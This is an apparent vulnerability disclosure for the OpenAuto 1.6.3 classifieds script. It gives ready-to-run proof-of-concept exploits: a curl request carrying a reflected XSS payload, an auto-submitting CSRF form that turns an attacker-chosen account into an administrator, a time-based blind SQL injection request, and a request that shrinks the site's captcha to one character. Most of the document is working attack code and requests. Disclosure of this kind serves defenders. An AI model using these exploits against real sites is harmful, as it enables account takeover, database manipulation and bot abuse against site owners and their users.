@@ -1,0 +1,84 @@
+Credit:Michael Brooks
+Affects:OpenAuto 1.6.3
+Vulnerabilites: XSRF/XSS/Blind SQLi/Captcha Bypass
+http://openautoclassifieds.com/
+----------------------------------------------------------------------------------------------------
+Reflective XSS by adding a onclick event handler.
+http://localhost/openauto_full_v1.6.3/contact.php
+Affected post variables:
+seller_contact_id
+listing
+company
+phone
+from_name
+
+XSS PoC:
+curl -d "from_name=Dave&phone=1-123-1234&company=Software
+Testing&submit=Submit&from_email=test@sometest38752.com&captcha=on&listing=\"
+onclick=alert(1) j=\" &seller_contact_id=1&news=1&subject=on&"
+http://localhost/openauto_full_v1.6.3/contact.php > xss_test.html
+----------------------------------------------------------------------------------------------------
+PoC XSRF exploit make a user account of the attacker's choice into an
+admin account:
+<html>
+	<form action="http://localhost/openauto_full_v1.6.3/admin/listuser.php"
+method="post">
+		<input id="company_name" name="company_name" type="text" size="30"
+maxlength="30" value="" />
+		<input id="first_name" name="first_name" type="text" size="30"
+maxlength="30" value="badmin" />
+		<input id="last_name" name="last_name" type="text" size="30"
+maxlength="30" value="badmin" />
+		<input id="phone" name="phone" type="text" size="30" maxlength="30"
+value="12312341234" />
+		<input id="alt_phone" name="alt_phone" type="text" size="30"
+maxlength="30" value="" />
+		<input id="fax" name="fax" type="text" size="30" maxlength="30" value="" />
+		<input id="email" name="email" type="text" size="35" maxlength="50"
+value="badmin@badmin.com" />
+		<input name="country" onchange="getZone(this.id)"size="1">
+		<input id="state" name="state" size="1">
+		<input id="city" name="city" type="text" size="30" maxlength="30" value="" />
+		<input id="address" name="address" type="text" size="30"
+maxlength="60" value="" />
+		<input id="zip" name="zip" type="text" size="6"/>
+		<input name="user_level" value=9/><!--a value of 9 makes this an
+admin account-->
+		<input id="user" name="user" type="hidden" value="badmin" />
+		<input id="id" name="id" type="hidden" value="5" /><!--Make sure
+this is the user ID of an account you control!-->
+		<input name="submit" value="update" />
+		<input type=submit id=s>
+	</form>
+	<script>
+		document.getElementById('s').click();
+	</script>
+</html>
+----------------------------------------------------------------------------------------------------
+Blind SQL Injection.  You must a dealer and you must be editing a
+listing that you have posted.
+PoC:
+curl http://localhost/openauto_full_v1.6.3/editlisting.php -d
+"ad_title=test&make=Acura&model=test&vehicle_type=4X4&doors=&color=&mileage=0&year=0000&listing_condition=&engine=&trans=&drive_train=&mpg=0&fuel_type=&price=0.00&adddesc=&vin=&stock=&country=&state=&city=&address=&zip=&seller=someuser&id=sleep(10)&submit=Update+Listing"
+Resulting query:
+UPDATE listings SET approved = 1, ad_title = 'test', make = 'Acura',
+model = 'test', vehicle_type = '4X4', doors = '', color = '', mileage
+= '0', year = '0000', listing_condition = '', engine = '', trans = '',
+drive_train = '', mpg = '0', fuel_type = '', price = '0.00', adddesc =
+'', features = '', vin = '', stock = '', country = '', city = '',
+state = '', address = '', zip = '', sold = '0', sellerid = '4', seller
+= 'someuser' WHERE id = sleep(10)
+----------------------------------------------------------------------------------------------------
+PoC this request will result in a capthca of only a single charicter
+to be dispalyed.
+http://172.16.111.128/Audits/other/openauto_full_v1.6.3/Captcha.php?characters=3&len=1
+After this request the $_SESSION["security_code"] will be overwritten
+and any captcha on the site will now be chaicter in size.
+
+This list is 53 chaciters long,  thus a blind bot has the chance of
+1/53 of guessing the correct answer.
+$possible = '23456789abcdefghjkmnpqrstvwxyzABCDEFGHJKLMNPQRSTVWXYZ';
+
+Vulnerable code:
+./openauto_full_v1.6.3/Captcha.php line 36:
+$len = isset($_GET['len']) && $_GET['characters'] > 2 ? $_GET['len'] : '6';
